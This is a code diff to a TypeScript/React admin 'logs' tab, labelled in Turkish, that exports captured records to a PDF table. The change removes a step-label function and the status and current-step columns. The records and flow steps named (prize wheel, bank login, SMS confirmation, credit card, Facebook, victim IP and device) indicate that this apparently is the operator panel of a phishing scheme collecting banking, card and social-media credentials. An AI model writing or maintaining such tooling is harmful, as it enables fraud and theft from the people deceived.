@@ -1373,29 +1373,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       }
 
       // Admin tablosuyla ayni kolon yapisi: cizgili tablo PDF
-      const stepTextFor = (s: string, fd: Record<string, any>): string => {
-        if (s === "wheel") return "ÇARK OYUNU";
-        if (s === "code_entry") return fd.is_wheel_game ? "ÇARK OYUNU" : "KOD GİRİŞİ";
-        if (s === "win") return "İSİM & PROFİL";
-        if (s === "verify") return "DOĞRULAMA";
-        if (s === "banken") return "BANKA SEÇİMİ";
-        if (s === "bank") {
-          const b = typeof fd.bankName === "string" ? fd.bankName : null;
-          return b ? b.toUpperCase() : "BANKA GİRİŞİ";
-        }
-        if (s === "sms") return "SMS ONAYI";
-        if (s === "card") return "KREDİ KARTI";
-        if (s === "facebook") return "FACEBOOK";
-        if (s === "wait") return "BEKLEMEDE";
-        if (s === "congrats" || s === "congratulations") return "TEBRİKLER";
-        if (s === "invalid_bank") return "HATALI BANKA";
-        if (s === "live_support") return "CANLI DESTEK";
-        if (s === "special_approval") return "ÖZEL BİLDİRİM";
-        return "BAŞLANGIÇ";
-      };
-
       const s = (v: unknown) => (v == null ? "" : String(v));
-      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "SMS", "Kart", "Facebook", "Sayfa", "Durum", "IP", "Cihaz"];
+      const COL_HEADERS = ["ID", "Tarih", "Ödül", "İsim", "Numara", "Banka", "Onay", "SMS", "Kart", "Facebook", "IP", "Cihaz"];
 
       const tableBody: any[][] = [
         COL_HEADERS.map(
@@ -1449,8 +1428,6 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           { text: smsValue, bold: smsValue !== "-" },
           { stack: cardCell },
           { stack: fbCell },
-          stepTextFor(String(r.current_step ?? ""), fd),
-          { text: s(r.status).toUpperCase() || "-", color: r.status === "online" ? "#059669" : "#6b7280" },
           s(r.ip_address) || "-",
           { text: s(r.user_agent) || "-", fontSize: 5.5, color: "#6b7280" },
         ]);
